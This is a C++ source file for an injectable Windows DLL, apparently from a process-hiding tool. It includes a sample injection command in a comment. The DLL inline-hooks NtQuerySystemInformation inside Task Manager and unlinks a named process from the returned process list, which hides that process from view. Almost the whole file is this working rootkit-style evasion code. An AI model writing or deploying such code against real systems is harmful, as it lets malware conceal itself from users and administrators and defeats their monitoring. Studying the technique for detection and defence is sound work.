// Inspired by this great article: https://edgix.co/task-manager/
// Sample injection command:	Injector.exe -ll ProcessHiderInjDll.dll Taskmgr.exe
#include "dllmain.h"

AbstractHook *g_pHook = nullptr;

__declspec(dllexport) 
NTSTATUS WINAPI HookedNtQuerySystemInformation(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID                    SystemInformation,
	ULONG                    SystemInformationLength,
	PULONG                   ReturnLength
)
{
	NTSTATUS status = reinterpret_cast<decltype(&NtQuerySystemInformation)>
		(g_pHook->getOriginalFunc())(
		SystemInformationClass,
		SystemInformation,
		SystemInformationLength,
		ReturnLength);
	PSYSTEM_PROCESS_INFORMATION previous, current;

	if (SystemInformationClass == SystemProcessInformation && NT_SUCCESS(status))
	{
		previous = reinterpret_cast<PSYSTEM_PROCESS_INFORMATION>(SystemInformation);
		current = reinterpret_cast<PSYSTEM_PROCESS_INFORMATION>(
			reinterpret_cast<PBYTE>(previous) + previous->NextEntryOffset);

		while (previous->NextEntryOffset)
		{
			//if (reinterpret_cast<DWORD>(current->UniqueProcessId) == g_hidden_pid)
			if (HIDDEN_PROCESS_IMAGE == current->ImageName.Buffer)
			{
				// remove current from the linked list
				if (current->NextEntryOffset)
				{
					previous->NextEntryOffset += current->NextEntryOffset;
				}
				else
				{
					previous->NextEntryOffset = 0;
				}
			}
			previous = current;
			current = reinterpret_cast<PSYSTEM_PROCESS_INFORMATION>(
				reinterpret_cast<PBYTE>(previous) + previous->NextEntryOffset);
		}
	}
	return status;
}


// This function is called if the dll is injected using SetWindowsHookEx
// and idHook is WH_CALLWNDPROC.
// It just calls the next hook procedure in the hook chain.
extern "C" __declspec(dllexport) 
LRESULT CALLBACK CallWndProc(
	_In_ int    nCode,
	_In_ WPARAM wParam,
	_In_ LPARAM lParam
)
{
	return CallNextHookEx(nullptr, nCode, wParam, lParam);
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		try
		{
			// A process is loading the DLL.
			g_pHook = new InlineHook("NtQuerySystemInformation", "ntdll.dll", &HookedNtQuerySystemInformation);
			//g_pHook = new IATHook("NtQuerySystemInformation", "ntdll.dll", &HookedNtQuerySystemInformation);
		}
		catch (const std::exception& e)
		{
			SharedMemory<char*> sm(DEBUG_SHARED_MEMORY_NAME);
			sm << e.what();
		}
		break;
	case DLL_THREAD_ATTACH:
		// A process is creating a new thread.
		break;
	case DLL_THREAD_DETACH:
		// A thread exits normally.
		break;
	case DLL_PROCESS_DETACH:
		// A process unloads the DLL.
		delete g_pHook;
		break;
	}
	return TRUE;
}
